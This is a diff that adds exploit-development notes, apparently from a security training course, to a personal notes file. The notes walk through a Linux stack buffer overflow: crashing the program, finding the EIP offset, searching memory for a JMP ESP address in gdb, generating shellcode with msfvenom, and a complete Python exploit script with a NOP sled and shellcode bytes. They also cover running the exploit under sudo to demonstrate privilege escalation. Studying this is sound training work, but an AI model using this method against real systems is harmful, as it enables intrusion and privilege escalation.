@@ -117,5 +117,87 @@ you can right click on hex to change it to decimal
 can also right click on variables to rename them
 param_1 is usually user input
 
+============== EXPLOIT DEVELOPMENT ================
+
+LINUX
+Once you can run the executable run it and see what sort of input it takes (param or user input)
+Add an excess of data to said executable and see if it gives a segmentation fault (core dumped) error
+
+run gdp func and then pdisass main to view the assembly code and run it on every function ex. pdisass getuserinput and look for the vulnerable function
+
+once you've found that it works get the executable back to your opstation so you can use gdb (type it into console and *should* get blood red prompt)
+type gdb <executable> to load it in and type run to run the program and make sure it still breaks correctly (SIGSEV error)
+The data you overflow the buffer with must end exactly at the EIP so code can be inserted (offset) which can be found on wiremask.eu and go to tools and Buffer Overflow Pattern Generator
+once there copy the text in the box then run the executable again and feed it the pattern you copied (run it in gdb), once done the EIP option in the results will be the hexadecimal register value that you then enter in the registry value in wiremask
+Create a python script as such with the offset you got:
+
+(this is just a test script to make sure we have EIP) --------------------------------
+#Declaring the offset as a variable
+offset = 'A' * 62
+
+#A check to make sure you actually have EIP (run in executable)
+eip = 'B' * 4 (make sure you know how big the EIP is)
+
+print(offset+eip)
+----------------------------------------------------------------------------------------
+
+then run this against executable using run <<< $(python /home/student/Downloads/BufferOverflow_Ex.py) (the triple carrot makes the command wait for user input such as running another command)
+FOR TESTING FIND A VALID JUMP ESP ON YOUR BOX (proof of concept) AND ON THEIR BOX
+
+now exit out of peda and run env - gdb to run normal gdb and run show env to see if you need to unset env LINES and unset env COLUMNS (make sure env empty)
+use file <executable> if you forgot to include the file your breaking
+once in normal gdb run and overflow the executable again to make sure it stil breaks
+then run info proc map along with find /b <first address you see under the [heap] in info proc map(make sure you use start addr)>, <first address above the [stack] in info proc map (make sure you use last address)>, 0xff(jump assembly hex), 0xe4(ESP assembly registry)
+
+use msfvenom -p linux/x86/exec CMD='/bin/whoami' -b "\x00" -f python to create your shellcode (CMD specifies a command to run) then copy all the buf and add it to your script
+
+NOW UPDATED PYTHON SCRIPT -----------------------------------------------------------------------------------
+
+#Declaring the offset as a variable
+offset = 'A' * 62
+
+#A check to make sure you actually have EIP (run in executable)
+#eip = 'B' * 4
+
+'''
+6 random addresses found by info proc map + find /b
+0xf7 f6 50 cf
+0xf7f65343
+0xf7f65497
+0xf7f655cf
+0xf7f65777
+0xf7f659ef
+0xf7f662eb
+'''
+
+#change from big to little endian
+#take any address and space it into bytes and put it in backwards for eip 
+eip = "\xcf\x50\xf6\xf7"
+
+#make NOP sled for shellcode
+nop = "\x90" * 10
+
+buf =  b""
+buf += b"\xdb\xc7\xb8\x34\x65\x03\xcb\xd9\x74\x24\xf4\x5b\x29"
+buf += b"\xc9\xb1\x0c\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2"
+buf += b"\xc1\x0f\x08\x93\xb0\x82\x68\x4b\xef\x41\xfc\x6c\x87"
+buf += b"\xaa\x8d\x1a\x57\xdd\x5e\xb9\x3e\x73\x28\xde\x92\x63"
+buf += b"\x26\x21\x12\x74\x18\x43\x7b\x1a\x49\xf4\x13\x8d\xf4"
+buf += b"\x97\x8a\x51\xa0\x34\xc5\xb3\x83\x3b"
+
+print(offset+eip+nop+buf)
+---------------------------------------------------------------------------------------
+
+finally run ./func <<< $(python /home/student/Downloads/BufferOverflow_Ex.py)
+can sudo previous command to prove privilege escalation is possible
+look for gdb on a target box to know you need to use buffer overflow
+run sudo -l to see what you can sudo
+
+for troubleshooting you can double your nop sled (reset if still not working)
+redo your shellcode to make sure it is correct (simplify your command just in case)
+if still not working try a new ip for eip
+if none of those work start from scratch
+
+
 
 
